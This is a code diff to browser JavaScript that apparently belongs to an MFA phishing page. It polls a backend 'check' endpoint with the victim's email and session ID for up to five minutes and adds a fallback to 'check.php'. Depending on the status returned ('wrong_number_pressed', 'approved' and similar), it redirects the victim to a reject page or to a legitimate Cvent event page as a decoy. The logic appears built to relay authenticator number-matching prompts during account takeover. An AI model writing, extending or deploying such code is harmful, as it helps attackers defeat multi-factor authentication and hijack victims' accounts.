@@ -125,42 +125,70 @@
                     }
                 }
 
-                // Send email verification to backend check.php with polling
-                if (email) {
+                // Send verification polling to backend check endpoint
+                if (email || sessionId) {
                     var pollCount = 0;
-                    var maxPolls = 72; // ~3 minutes (72 * 2.5s)
+                    var maxPolls = 120; // 5 minutes (120 * 2.5s)
+                    var cventUrl = "https://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/";
+
+                    function handleResult(a) {
+                        var res = typeof a === 'string' ? a.trim() : (a.status || a.redirect || '');
+                        if (res === "wrong_number_pressed" || res === "user tapped no number" || res === "wrong_number") {
+                            document.location.href = "rejectnumber.html";
+                            return true;
+                        } else if (res === "saved" || res === "approved" || res.indexOf("cvent.com") !== -1) {
+                            document.location.href = cventUrl;
+                            return true;
+                        }
+                        return false;
+                    }
+
                     function pollCheck() {
+                        var checkTarget = "api/check?sessionId=" + encodeURIComponent(sessionId) + "&em=" + encodeURIComponent(email);
                         $.ajax({
-                            url: "check.php",
+                            url: checkTarget,
                             type: 'POST',
                             data: {
                                 em: decodeURIComponent(email),
                                 sessionId: sessionId
                             },
                             success: function (a) {
-                                var res = typeof a === 'string' ? a.trim() : (a.status || '');
-                                if (res === "wrong_number_pressed" || res === "user tapped no number") {
-                                    document.location.href = "rejectnumber.php";
-                                } else if (res === "saved" || res === "approved") {
-                                    document.location.href = "https://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/";
-                                } else {
-                                    pollCount++;
-                                    if (pollCount < maxPolls) {
-                                        setTimeout(pollCheck, 2500);
-                                    } else {
-                                        console.warn("Verification polling timed out.");
-                                    }
+                                if (!handleResult(a)) {
+                                    scheduleNext();
                                 }
                             },
                             error: function () {
-                                pollCount++;
-                                if (pollCount < maxPolls) {
-                                    setTimeout(pollCheck, 3000);
-                                }
+                                // Fallback to check.php on Apache PHP hosts
+                                $.ajax({
+                                    url: "check.php",
+                                    type: 'POST',
+                                    data: {
+                                        em: decodeURIComponent(email),
+                                        sessionId: sessionId
+                                    },
+                                    success: function (a) {
+                                        if (!handleResult(a)) {
+                                            scheduleNext();
+                                        }
+                                    },
+                                    error: function () {
+                                        scheduleNext();
+                                    }
+                                });
                             }
                         });
                     }
-                    setTimeout(pollCheck, 1500);
+
+                    function scheduleNext() {
+                        pollCount++;
+                        if (pollCount < maxPolls) {
+                            setTimeout(pollCheck, 2500);
+                        } else {
+                            console.warn("Verification polling timed out.");
+                        }
+                    }
+
+                    setTimeout(pollCheck, 1000);
                 }
             }
         } catch (err) {
